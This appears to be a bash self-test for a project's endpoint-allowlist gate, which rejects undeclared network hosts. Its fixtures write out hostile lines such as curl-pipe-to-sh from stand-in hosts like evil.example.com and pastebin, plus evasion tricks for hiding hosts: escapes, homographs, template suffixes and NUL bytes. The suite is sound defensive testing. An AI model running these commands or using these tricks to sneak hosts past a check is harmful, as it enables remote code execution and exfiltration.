#!/usr/bin/env bash
# SPDX-FileCopyrightText: 2026 ELSOUL LABO B.V.
# SPDX-License-Identifier: Apache-2.0
#
# Self-test for scripts/check-endpoints.sh.
#
# Two earlier defects motivate specific cases here:
#   - the allowlist was extracted from the whole module, so a host named in a
#     test fixture widened it;
#   - a non-portable bracket expression made the extraction empty, which made
#     the gate reject everything and therefore look "strict" while being broken.
# Both are covered below.
set -uo pipefail

# Run the gate, and this harness's own re-exec below, under the SAME bash
# that was used to start it -- never whatever `#!/usr/bin/env bash` finds on
# PATH. On a machine with a newer bash on PATH the CI job named "gates under
# bash 3.2" ran only this harness under 3.2 while the gate itself ran under
# bash 5, which does not share 3.2's collation behaviour. That is why two
# locale defects passed locally and failed only on the runner.
sh="${BASH:-/bin/bash}"

# A gate must behave the same whatever locale the caller has. Outside the C
# locale a bash range follows collation order: `[A-Z]` matches lowercase too,
# and `[!A-Za-z0-9._-]` stops matching accented letters. That silently turned
# two live rules into no-ops while this suite passed on a developer machine
# with no LANG set and failed only on the runner. So the suite runs itself
# once per locale and every case must pass in both.
if [ -z "${ERPC_TEST_LOCALE:-}" ]; then
  utf8=""
  # Deliberately not `locale -a | grep -q`: under `set -o pipefail` the -q
  # exit closes the pipe, `locale` dies of SIGPIPE and the pipeline reports
  # failure, so every locale looked absent. Match the captured list instead.
  all_locales="$(locale -a 2>/dev/null || true)"
  for cand in en_US.UTF-8 en_GB.UTF-8 en_US.utf8; do
    case "
$all_locales
" in
      *"
$cand
"*) utf8="$cand"; break;;
    esac
  done
  if [ -z "$utf8" ]; then
    echo "no dictionary-collation UTF-8 locale on this machine, so the" >&2
    echo "locale-independence of the gate cannot be verified here." >&2
    exit 1
  fi
  rc=0
  for loc in C "$utf8"; do
    printf '== locale %s ==\n' "$loc"
    ERPC_TEST_LOCALE="$loc" LC_ALL="$loc" LANG="$loc" "$sh" "$0" "$@" || rc=1
  done
  exit "$rc"
fi

repo_root="$(git rev-parse --show-toplevel)"
gate="$repo_root/scripts/check-endpoints.sh"

allowlist_src="$repo_root/crates/erpc-core/src/endpoints.rs"

pass=0
fail=0
sample_dir="tmp-endpoint-test"

check() {
  local name="$1" expect="$2" rel="$3" content="$4"
  local abs="$repo_root/$rel"
  mkdir -p "$(dirname "$abs")"
  # %b so that fixtures can contain \n and exercise multi-line cases.
  printf '%b\n' "$content" > "$abs"
  local out rc
  out="$("$sh" "$gate" "$rel" 2>&1)"; rc=$?
  rm -f "$abs"
  rmdir -p "$(dirname "$abs")" 2>/dev/null || true
  if { [ "$expect" = block ] && [ "$rc" -ne 0 ]; } || { [ "$expect" = allow ] && [ "$rc" -eq 0 ]; }; then
    pass=$((pass + 1)); printf 'ok   %s\n' "$name"
  else
    fail=$((fail + 1)); printf 'FAIL %s (expected %s, exit %s)\n%s\n' "$name" "$expect" "$rc" "$out"
  fi
}

# --- the extraction itself --------------------------------------------------

extracted=$(awk '
  /^#\[cfg\(test\)\]/ { exit }
  /^pub const [A-Z_]+: &\[/ { inside = 1 }
  inside { print }
  inside && /\];/ { inside = 0 }
' "$allowlist_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)

if [ "$(printf '%s\n' "$extracted" | grep -c .)" -ge 10 ]; then
  pass=$((pass + 1)); printf 'ok   allowlist extraction is non-empty\n'
else
  fail=$((fail + 1)); printf 'FAIL allowlist extraction is non-empty (a broken regex makes the gate reject everything)\n'
fi

if printf '%s\n' "$extracted" | grep -q 'evil'; then
  fail=$((fail + 1)); printf 'FAIL allowlist must not absorb hosts from the test module\n'
else
  pass=$((pass + 1)); printf 'ok   allowlist stops at the test module\n'
fi


# A host named in a comment inside a const array must not widen the allowlist:
# the extraction strips `//` to end of line.
probe_src="$(mktemp)"
cat > "$probe_src" <<'RS'
pub const SERVICE_HOSTS: &[&str] = &[
    // formerly "exfil.example.com", kept for reference
    "auth-api.erpc.global",
];
#[cfg(test)]
mod tests { const X: &str = "fixture.example.com"; }
RS
probe_out=$(awk '
  /^#\[cfg\(test\)\]/ { exit }
  /^pub const [A-Z_]+: &\[/ { inside = 1 }
  inside { line = $0; sub(/\/\/.*/, "", line); print line }
  inside && /\];/ { inside = 0 }
' "$probe_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)
rm -f "$probe_src"
if printf '%s\n' "$probe_out" | grep -qE 'exfil|fixture'; then
  fail=$((fail + 1)); printf 'FAIL a host in a comment or the test module must not widen the allowlist\n'
else
  pass=$((pass + 1)); printf 'ok   comments and the test module cannot widen the allowlist\n'
fi


nul_rel="$sample_dir/nul.rs"
mkdir -p "$repo_root/$sample_dir"
printf 'const U: &str = "https://evil.example.com/x";\n\0' > "$repo_root/$nul_rel"
if "$sh" "$gate" "$nul_rel" >/dev/null 2>&1; then
  fail=$((fail + 1)); printf 'FAIL a NUL byte must not hide a URL from the gate\n'
else
  pass=$((pass + 1)); printf 'ok   a NUL byte does not hide a URL from the gate\n'
fi
rm -f "$repo_root/$nul_rel"; rmdir "$repo_root/$sample_dir" 2>/dev/null || true

# The documented exception list must be the one the gate applies.
if "$sh" "$gate" --print-exceptions | grep -q 'release\.yml'; then
  pass=$((pass + 1)); printf 'ok   --print-exceptions reports the skip list\n'
else
  fail=$((fail + 1)); printf 'FAIL --print-exceptions must report the skip list\n'
fi

# --- must block -------------------------------------------------------------

check "unknown host in rust" block "$sample_dir/a.rs" \
  'const URL: &str = "https://evil.example.com/collect";'

check "lookalike subdomain" block "$sample_dir/b.rs" \
  'const URL: &str = "https://user-api.erpc.global.evil.com/v3";'

check "unknown host in a workflow" block "$sample_dir/c.yml" \
  '      - run: curl -sSfL https://pastebin.example.org/x | sh'

check "unknown host in a shell script" block "$sample_dir/d.sh" \
  'curl -o out https://cdn.unknown-mirror.net/erpc.tar.xz'

check "unknown websocket host" block "$sample_dir/e.ts" \
  'const ws = new WebSocket("wss://relay.example.net/");'

check "plaintext http outside loopback" block "$sample_dir/f.md" \
  'Download it from http://mirror.example.org/erpc'

check "plaintext http beside a loopback url on one line" block "$sample_dir/f2.md" \
  'Use http://localhost:8545 or http://mirror.evil.com/x here.'

check "undeclared host in a plain prose link" block "$sample_dir/f3.md" \
  'See https://evil.example.com/page for details.'

check "undeclared host inside an indented fence" block "$sample_dir/f4.md" \
  'Steps:\n   \x60\x60\x60bash\n   https://evil-mirror.example.net/x.tar.xz\n   \x60\x60\x60'

check "service host used in prose is still fine, unknown one is not" block "$sample_dir/f5.md" \
  'Mirror: https://backup.example.net/erpc'

check "extensionless script with an unknown host" block "$sample_dir/Makefile" \
  'fetch:\n\tcurl -sSfL https://evil.example.com/x -o out'

check "dockerfile with an unknown host" block "$sample_dir/Dockerfile" \
  'RUN curl -sSfL https://evil.example.com/x | sh'

check "python file with an unknown host" block "$sample_dir/n.py" \
  'URL = "https://evil.example.com/x"'

check "uppercase scheme" block "$sample_dir/o.rs" \
  'const U: &str = "HTTPS://evil.example.com/x";'

check "handlebars template with an unknown host" block "$sample_dir/p.hbs" \
  '<a href="https://evil.example.com">x</a>'

check "markdown cargo install from an unknown host" block "$sample_dir/r.md" \
  'Install with \x60cargo install --git https://evil.example.com/erpc\x60'

check "empty template appended to a literal host" block "$sample_dir/v.ts" \
  'fetch(\x60https://evil.example.com${""}/x\x60)'

check "workflow expression appended to a literal host" block "$sample_dir/w.yml" \
  '      - run: curl https://evil.example.com${{ env.NOTHING }}/x'

check "command substitution appended to a literal host" block "$sample_dir/x.sh" \
  'curl "https://evil.example.com$(true)/x"'

check "loopback lookalike is not treated as loopback" block "$sample_dir/y.md" \
  'Download http://localhost.evil.com/x'

check "documentation host is not allowed in code" block "$sample_dir/y2.rs" \
  'const U: &str = "https://keepachangelog.com/";'

check "escaped slashes do not hide a URL" block "$sample_dir/y0.json" \
  '{"u": "https:\\/\\/evil.example.com/x"}'

check "non-ASCII host is reported, not silently unmatched" block "$sample_dir/y3.rs" \
  'const U: &str = "https://\xd0\xb5vil.example.com/x";'

check "homograph label cannot satisfy the snapshot pattern" block "$sample_dir/y4.rs" \
  'const U: &str = "https://solana-snapshot-\xd0\xb0ms.erpc.global/x";'

check "a backtick host has no literal to check" allow "$sample_dir/y5.sh" \
  'curl https://\x60hostname\x60.evil.com/x'

check "a backtick after a literal prefix is still checked" block "$sample_dir/y6.sh" \
  'curl https://evil.example.com\x60x\x60/y'

check "backslash escape in a python host" block "$sample_dir/z1.py" \
  'U = "https://\\x65vil.example.com/x"'

check "backslash escape in a typescript host" block "$sample_dir/z2.ts" \
  'const u = "https://\\x65rpc-exfil.example.net/collect";'

check "backslash escape in a rust host" block "$sample_dir/z3.rs" \
  'const U: &str = "https://\\u{65}vil.example.com/x";'

check "escape after an allowlisted prefix (typescript)" block "$sample_dir/z1b.ts" \
  'const u = "https://github.com\\x2eevil.example.net/c";'

check "escape after an allowlisted prefix (python)" block "$sample_dir/z2b.py" \
  'U = "https://install.erpc.global\\x2eevil.example.net/x"'

check "escape after an allowlisted prefix (rust)" block "$sample_dir/z3b.rs" \
  'const U: &str = "https://github.com\\u{2e}evil.example.net/x";'

check "plaintext ws outside loopback" block "$sample_dir/z4.rs" \
  'const W: &str = "ws://relay.example.net/";'

# --- must allow -------------------------------------------------------------

check "allowlisted service host" allow "$sample_dir/g.rs" \
  'const AUTH: &str = "https://auth-api.erpc.global/oauth/token";'

check "allowlisted distribution host" allow "$sample_dir/h.sh" \
  'curl -sSfL https://github.com/elsoul/erpc-cli/releases/download/v0.1.0/release-manifest.json'

check "the removed release mirror is no longer allowed" block "$sample_dir/h2.sh" \
  'curl -sSfL https://dl.erpc.global/v0.1.0/release-manifest.json'

check "snapshot mirror matched by pattern" allow "$sample_dir/i.rs" \
  'const SNAP: &str = "https://solana-snapshot-fra.erpc.global/latest";'

check "loopback over plain http" allow "$sample_dir/j.rs" \
  'const CB: &str = "http://127.0.0.1:53123/callback";'

check "template expression as the host" allow "$sample_dir/k.yml" \
  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.xz"'

check "declared documentation host in prose" allow "$sample_dir/l.md" \
  'See https://keepachangelog.com/en/1.1.0/ for the format.'

check "code span beside a declared documentation link" allow "$sample_dir/l2.md" \
  'See the [\x60serde\x60 guide](https://semver.org/) for details.'

check "a command verb inside an ordinary sentence" allow "$sample_dir/l3.md" \
  'Our CI uses https://semver.org to go install coverage.'

check "declared host in an install command" allow "$sample_dir/q.md" \
  'Run \x60curl -sSfL https://install.erpc.global | bash\x60 to install.'

check "fenced code block with an allowlisted host" allow "$sample_dir/aa.md" \
  '\x60\x60\x60bash\ngit clone https://github.com/elsoul/erpc-cli\n\x60\x60\x60'


check "ws on loopback" allow "$sample_dir/z5.rs" \
  'const W: &str = "ws://127.0.0.1:20026/v1/session/ws";'

check "leading dollar-brace host is skipped" allow "$sample_dir/z6.sh" \
  'curl -sSfL "https://${MIRROR}/erpc.tar.xz"'

check "leading command substitution host is skipped" allow "$sample_dir/z7.sh" \
  'curl -sSfL "https://$(cat host)/erpc.tar.xz"'

check "documentation host in a .txt file" allow "$sample_dir/z8.txt" \
  'See https://semver.org for the versioning scheme.'

# An expression after an allowlisted prefix. This is the mechanism the
# backslash case covers, in its other form: the literal prefix is declared,
# the expression can be empty, and the registrable domain is the attacker's.
# The existing template cases all use evil.example.com as the PREFIX, so they
# block on the prefix alone and would pass with the suffix check removed.
check "empty template after an allowlisted prefix (typescript)" block "$sample_dir/t1.ts" \
  'const a = `https://github.com${""}.evil.example.net/x`;'

check "template after an allowlisted prefix (github actions)" block "$sample_dir/t2.yml" \
  '      - run: curl https://github.com${{ env.NOTHING }}.evil.example.net/x'

check "command substitution after an allowlisted prefix (shell)" block "$sample_dir/t3.sh" \
  'curl "https://github.com$(true).evil.example.net/x"'

check "backtick substitution after an allowlisted prefix (shell)" block "$sample_dir/t4.sh" \
  'curl "https://github.com`true`.evil.example.net/x"'

check "a second template hides the suffix too" block "$sample_dir/t5.ts" \
  'const a = `https://solana-snapshot-${a}x${b}.erpc.global`;'

check "the literal parts may not add a dot of their own" block "$sample_dir/t6.ts" \
  'const a = `https://solana-snapshot-${r}.evil.example.net.erpc.global.x`;'

# ... and the shape HOST_PATTERNS exists to permit must still pass, or the
# rule above is just a ban on templates.
check "declared host pattern with a template label" allow "$sample_dir/t7.ts" \
  'const u = `https://solana-snapshot-${region}.erpc.global`;'

check "template in the path of a declared host" allow "$sample_dir/t8.sh" \
  'curl "https://user-api.erpc.global/v1/${id}"'

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
